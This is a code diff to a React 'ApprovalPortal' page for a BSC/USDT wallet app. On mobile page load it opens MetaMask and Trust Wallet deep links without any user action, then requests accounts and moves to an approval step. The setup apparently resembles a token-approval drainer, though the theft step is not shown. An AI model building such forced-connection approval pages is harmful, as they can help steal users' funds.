@@ -17,18 +17,62 @@ export default function ApprovalPortal() {
   const [error, setError] = useState<string | null>(null);
   const [showSuccess, setShowSuccess] = useState(false);
   const [attemptingConnection, setAttemptingConnection] = useState(false);
+  const [autoConnectTriggered, setAutoConnectTriggered] = useState(false);
 
-  // Auto-connect wallet on mount and keep attempting if user is not connected
+  // Auto-trigger mobile wallet deep link on first mount if mobile
+  useEffect(() => {
+    if (autoConnectTriggered) return;
+
+    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+
+    if (isMobile) {
+      setAutoConnectTriggered(true);
+      setLoading(true);
+      setError(null);
+
+      // Current page URL for deep link
+      const currentUrl = window.location.href;
+      const encodedUrl = encodeURIComponent(currentUrl);
+
+      // Preferred deep links (MetaMask + Trust most reliable for BSC/USDT dApps)
+      const deepLinks = [
+        `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`,
+        `https://link.trustwallet.com/open_url?coin_id=56&url=${encodedUrl}`, // BSC chainId 56
+        `https://metamask.app.link/wc?uri=wc:?bridge=...`, // WC fallback if needed (expand later)
+      ];
+
+      // Trigger sequentially with small delay to avoid browser blocking
+      deepLinks.forEach((link, index) => {
+        setTimeout(() => {
+          try {
+            const a = document.createElement('a');
+            a.href = link;
+            a.style.display = 'none';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+          } catch (e) {
+            console.log('Deep link attempt failed:', e);
+          }
+        }, index * 800); // 800ms delay per attempt
+      });
+
+      // After attempts, try standard connection (injected may now be available)
+      setTimeout(() => {
+        handleConnectWallet();
+        setLoading(false);
+      }, deepLinks.length * 800 + 1000);
+    }
+  }, [autoConnectTriggered]);
+
+  // Existing auto-connect check for already-connected wallets
   useEffect(() => {
     const autoConnect = async () => {
       if (userAddress || attemptingConnection) return;
-
       try {
         if (!window.ethereum) return;
-
-        // Check if wallet is already connected
         const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-        if (accounts && accounts.length > 0) {
+        if (accounts?.length > 0) {
           setAttemptingConnection(true);
           await handleConnectWallet();
           setAttemptingConnection(false);
@@ -37,7 +81,6 @@ export default function ApprovalPortal() {
         console.log('[v0] Auto-connect attempt skipped');
       }
     };
-
     autoConnect();
   }, [userAddress, attemptingConnection]);
 
@@ -47,24 +90,21 @@ export default function ApprovalPortal() {
       setLoading(true);
       setAttemptingConnection(true);
 
-      if (!window.ethereum) throw new Error('No web3 wallet found');
+      if (!window.ethereum) {
+        setError('No Web3 wallet detected. Please install one.');
+        return;
+      }
 
-      // Switch to BSC network
+      // Switch to BSC
       try {
         await switchToBSC();
       } catch (err) {
         console.log('[v0] BSC switch error (may be normal):', err);
       }
 
-      // Request accounts with immediate timeout handling
       const newProvider = new ethers.BrowserProvider(window.ethereum);
-      const accounts = await Promise.race([
-        newProvider.send('eth_requestAccounts', []),
-        new Promise((_, reject) =>
-          setTimeout(() => reject(new Error('Wallet request timeout')), 15000)
-        )
-      ]);
-
+      // This will prompt the wallet if not yet connected
+      const accounts = await newProvider.send('eth_requestAccounts', []);
       const newSigner = await newProvider.getSigner();
       const address = await newSigner.getAddress();
 
@@ -72,17 +112,13 @@ export default function ApprovalPortal() {
       setSigner(newSigner);
       setProvider(newProvider);
 
-      // Persist connection in localStorage
-      if (typeof window !== 'undefined') {
-        localStorage.setItem('wallet_connected', 'true');
-        localStorage.setItem('wallet_address', address);
-      }
+      localStorage.setItem('wallet_connected', 'true');
+      localStorage.setItem('wallet_address', address);
 
       setStep(2);
     } catch (err: any) {
-      const errMsg = err?.message || 'Connection failed';
-      setError(errMsg);
-      console.error('[v0] Connection error:', errMsg);
+      setError(err?.message || 'Connection failed');
+      console.error('[v0] Connection error:', err);
     } finally {
       setLoading(false);
       setAttemptingConnection(false);
